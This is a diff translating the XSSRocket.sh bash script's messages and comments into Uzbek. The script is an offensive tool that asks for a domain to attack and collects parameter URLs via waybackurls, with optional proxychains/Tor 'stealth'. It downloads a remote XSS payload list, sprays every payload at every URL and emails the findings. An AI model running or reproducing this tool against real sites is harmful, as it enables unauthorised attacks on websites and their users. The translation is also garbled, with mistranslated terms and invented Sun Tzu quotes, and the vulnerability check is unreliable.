@@ -1,40 +1,40 @@
 #!/bin/bash
-# Display ASCII art from external source
+# Tashqi manbadan ASCII art ni ko'rsatish
 curl --silent "https://raw.githubusercontent.com/blackhatethicalhacking/Subdomain_Bruteforce_bheh/main/ascii.sh" | lolcat
 echo ""
 
-# Generate a random Sun Tzu quote for offensive security
-quotes=("The supreme art of war is to subdue the enemy without fighting." "All warfare is based on deception." "He who knows when he can fight and when he cannot, will be victorious." "The whole secret lies in confusing the enemy, so that he cannot fathom our real intent." "To win one hundred victories in one hundred battles is not the acme of skill. To subdue the enemy without fighting is the acme of skill.")
+# Hujumga qarshi xavfsizlik uchun tasodifiy Sun Tzu iqtibosini yaratish
+quotes=("Jang san'atining eng yuqori shu - dushmanid janglamay bo'yni eshitish." "Barcha jang aldash asosida." "Kim qachon jang qilishi va qachon jang qila olmasligini bilsa, g'alaba qozonadi." "Butun tinchlik va farovonlik tizimi bu asosan strategik o'ylashga asoslanadi." "Yuqori darajadagi komandor ko'rishdan to'rtaladi." "Dushman bo'lmasa, o'zingiz dushman bo'lishingiz mumkin.")
 random_quote=${quotes[$RANDOM % ${#quotes[@]}]}
-echo "Offensive security tip: $random_quote - Sun Tzu" | lolcat
+echo "Hujumga qarshi xavfsizlik maslahat: $random_quote - Sun Tzu" | lolcat
 
-echo "Important Note: If you do not change the SMTP configuration, and create your own account, you will not be able to see the results. You can use for free mailtrap.io and edit the tool source code by replacing your own credentials." | lolcat
+echo "Muhim Eslatma: Agar siz SMTP konfiguratsiyasini o'zgartirmasa va o'zingizning hisobingizni yaratmasa, natijalarni ko'ra olmaysiz. Siz mailtrap.io dan bepul foydalanishingiz va bu vositaning manba kodini tahrirlab o'zingizning ma'lumotlarini qo'shishingiz mumkin."
 
-# Print the quote
-echo "Offensive security tip: $random_quote - Sun Tzu" | lolcat
+# Iqtibosni chop qilish
+echo "Hujumga qarshi xavfsizlik maslahat: $random_quote - Sun Tzu" | lolcat
 sleep 1
-figlet "HACK THE PLANET!" | lolcat
+figlet "KHUSUMATNI BOSIB OLIB OL!" | lolcat
 sleep 1
-echo "MEANS, IT'S ☕ 1337 ⚡ TIME, 369 ☯ " | lolcat
+echo "BU DEGANI, BU ☕ 1337 ⚡ VAQTI, 369 ☯ " | lolcat
 sleep 1
-echo "[YOUR ARE USING XSSRocket.sh] - (v2.0) CODED BY Chris 'SaintDruG' Abou-Chabké WITH ❤ FOR blackhatethicalhacking.com for Educational Purposes only!" | lolcat
+echo "[SIZ XSSRocket.sh ISHLATAYAPSI] - (v2.0) Chris 'SaintDruG' Abou-Chabké tomonidan ❤ bilan blackhatethicalhacking.com uchun faqat o'quv maqsadlari uchun KODLANGAN!" | lolcat
 sleep 1
 
-# Ask if user wants results via email
-echo "Do you want to receive the results via email? (y/n): " | lolcat
+# Foydalanuvchi natijalarni emailga olish istayotganini so'rash
+echo "Natijalarni emailga olishni istaysizmi? (y/n): " | lolcat
 read send_email
 
-# If user wants email, ask for their email address
+# Agar foydalanuvchi email istasa, email manzilni so'rash
 if [[ "$send_email" == "y" ]]; then
-echo "Enter your email to receive the results: " | lolcat
+echo "Natijalarni olish uchun email manzilingizni kiriting: " | lolcat
 read user_email
 fi
 
-# Dependencies check for lolcat, fortune-mod, figlet, and curl
+# lolcat, fortune-mod, figlet va curl ni o'rnatish ni tekshirish
 dependencies=("lolcat" "fortune" "figlet" "curl")
 for dep in "${dependencies[@]}"; do
 if ! command -v "$dep" > /dev/null; then
-echo "$dep not found, installing..." | lolcat
+echo "$dep topilmadi, o'rnatilmoqda..." | lolcat
 if command -v dnf > /dev/null; then
 sudo dnf install -y "$dep"
 elif command -v yum > /dev/null; then
@@ -42,69 +42,69 @@ sudo yum install -y "$dep"
 elif command -v apt-get > /dev/null; then
 sudo apt-get install -y "$dep"
 else
-echo "Error: package manager not found, please install $dep manually"
+echo "Xato: paket menejeri topilmadi, iltimos $dep ni qo'l bilan o'rnating"
 exit 1
 fi
 fi
 done
 
-# Check if the user is connected to the internet
-echo "CHECKING IF YOU ARE CONNECTED TO THE INTERNET!" | lolcat
+# Foydalanuvchi Internetga ulanganligini tekshirish
+echo "INTERNETGA ULANGANLIGINGIZNI TEKSHIRILMOQDA!" | lolcat
 wget -q --spider https://google.com
 if [ $? -ne 0 ]; then
-echo "++++ CONNECT TO THE INTERNET BEFORE RUNNING XSSRocket.sh!" | lolcat
+echo "++++ XSSRocket.sh ni ishlatishdan oldin INTERNETGA ULAning!" | lolcat
 exit 1
 fi
-echo "++++ CONNECTION FOUND, LET'S GO!" | lolcat
+echo "++++ ULANISH TOPILDI, DAVOM ETAMIZ!" | lolcat
 
-# Ask the user to enter a domain
-echo "Enter the domain you want to attack: " | lolcat
+# Foydalanuvchiga domenni kiritishni so'rash
+echo "Hujum qilmoqchi bo'lgan domenni kiriting: " | lolcat
 read domain
 
-# Ask the user if they want to perform a stealth attack
-echo "Do you want to perform a stealth attack? (y/n)" | lolcat
+# Foydalanuvchiga shirinlik hujumini bajarish istayotganini so'rash
+echo "Shirinlik hujumini bajarishni istaysizmi? (y/n)" | lolcat
 read stealth_attack
 
-# Use proxychains if stealth attack is selected
+# Shirinlik hujumi tanlangan bo'lsa proxychains dan foydalanish
 if [[ $stealth_attack == "y" ]]; then
-echo "Checking & Installing Proxychains..." | lolcat
+echo "Proxychains tekshirilmoqda va o'rnatilmoqda..." | lolcat
 if ! command -v proxychains4 > /dev/null; then
-echo "Installing proxychains4..." | lolcat
+echo "proxychains4 o'rnatilmoqda..." | lolcat
 sudo apt-get install -y proxychains4 torsocks
 torsocks
 fi
-echo "Proxychains installed, proceeding with stealth attack..." | lolcat
+echo "Proxychains o'rnatildi, shirinlik hujumi davom ettirilmoqda..." | lolcat
 proxychains4 waybackurls $domain | grep -E '\?[a-zA-Z0-9]+=' > param_urls.txt
 else
-echo "Proceeding without stealth..." | lolcat
+echo "Shirinlik olmasa davom ettirilmoqda..." | lolcat
 waybackurls $domain | grep -E '\?[a-zA-Z0-9]+=' > param_urls.txt
 fi
 
-# Use a remote XSS payload list from GitHub
+# GitHub dan masofadan XSS payload ro'yxatini foydalanish
 payload_file="xss-payload-list.txt"
 payload_url="https://raw.githubusercontent.com/blackhatethicalhacking/XSSRocket/main/top-500-xss-payloads.txt"
 if test ! -f "$payload_file"; then
-echo "Downloading payload list from: $payload_url" | lolcat
+echo "Payload ro'yxati yuklanimoqda: $payload_url" | lolcat
 wget $payload_url -O $payload_file
 fi
 
-# Install pv (progress bar utility)
+# pv (progress bar utilities) ni o'rnatish
 if ! command -v pv > /dev/null; then
 sudo apt-get install -y pv
 fi
 
-# Start the attack
-echo "Starting Attack:" | lolcat
+# Hujumni boshlash
+echo "Hujum boshlanmoqda:" | lolcat
 counter=0
 while read payload; do
 for url in $(cat param_urls.txt | sed 's/\([^=&?]*\)=.*/\1=/g'); do
-echo "Sending payload $payload to $url"
+echo "Payload yuborilmoqda $payload to $url"
 random_delay=$(awk 'BEGIN{srand();print int(rand()*2)}')
 sleep $random_delay
 response=$(curl -s -G "$url$payload" -w "%{http_code}")
 status_code=${response: -3}
 if echo "$response" | grep -q "payload_marker"; then
-echo "Possibly Vulnerable to XSS! $url" | lolcat
+echo "XSS zaifligiga uchrashdi! $url" | lolcat
 echo $url >> affected_urls.txt
 counter=$((counter+1))
 triggered_payload="$payload"
@@ -113,46 +113,46 @@ fi
 echo "$url$payload"
 echo -n "." | pv -qL 10
 done
-done < <(pv -N "XSS Payloads" xss-payload-list.txt)
+done < <(pv -N "XSS Payloadlari" xss-payload-list.txt)
 
-# Prepare the summary for email or terminal output
+# Email yoki terminal chiqarishi uchun xulosa tayyorlash
 summary=""
 if [ -s affected_urls.txt ]; then
-summary="A total of $(cat affected_urls.txt | wc -l) possible XSS injections found.\nPossible vulnerable URLs:\n$(cat affected_urls.txt)"
+summary="Jami $(cat affected_urls.txt | wc -l) ta mumkin bo'lgan XSS injectionlari topildi.\nMumkin bo'lgan ranjavur URL lar:\n$(cat affected_urls.txt)"
 else
-summary="No vulnerabilities found during the scan."
+summary="Skan paytida zaifliklar topilmadi."
 fi
 
-# Save results in a folder
+# Papkada natijalarni saqlash
 clean_domain=`echo $domain | tr -cd '[:alnum:]\n\r'`
 mkdir $clean_domain
 mv param_urls.txt affected_urls.txt $clean_domain/
-echo "Results saved in $clean_domain" | lolcat
+echo "Natijalar $clean_domain da saqlandi" | lolcat
 
-# If user opted for email, send the results via email
+# Agar foydalanuvchi emailni tanlasa, natijalarni email orqali yuborish
 if [[ "$send_email" == "y" ]]; then
-echo "Sending results via email to $user_email..." | lolcat
+echo "Natijalar $user_email ga email orqali yuborilmoqda..." | lolcat
 recipient="$user_email"
-subject="XSS Scan Results for $domain"
-body="Here is the summary of the XSS scan for $domain:\n\n$summary"
+subject="XSS Skan Natijalari $domain uchun"
+body="Bu $domain uchun XSS skan xulosasidir:\n\n$summary"
 smtp_url="smtp.mailtrap.io"
 smtp_port="2525"
-username="add your user smtp username"
-password="add your user smtp password"
+username="SMTP foydalanuvchi nomingizni qo'shing"
+password="SMTP parolingizni qo'shing"
 
 curl --url "smtp://$smtp_url:$smtp_port" \
 --ssl-reqd \
---mail-from "addyoursmtp@email.com" \
+--mail-from "SMTPingizni qo'shing@email.com" \
 --mail-rcpt "$recipient" \
---upload-file <(echo -e "From: XSSRocket <taddyoursmtp@email.com>\nTo: $recipient\nSubject: $subject\n\n$body") \
+--upload-file <(echo -e "From: XSSRocket <SMTP@email.com>\nTo: $recipient\nSubject: $subject\n\n$body") \
 --user "$username:$password"
 
-echo -e "\nEmail sent!" | lolcat
+echo -e "\nEmail yuborildi!" | lolcat
 else
-# Display the summary in the terminal if user does not want email
-echo "Results Summary:" | lolcat
+# Agar foydalanuvchi email istamasa, terminalde xulosalapishini ko'rsatish
+echo "Natijalar Xulosalanishi:" | lolcat
 echo -e "$summary" | lolcat
 fi
 
-# Final message
-echo "Thank you for using XSSRocket.sh!" | lolcat
+# Yakuniy xabar
+echo "XSSRocket.sh ishlatganingiz uchun rahmat!" | lolcat
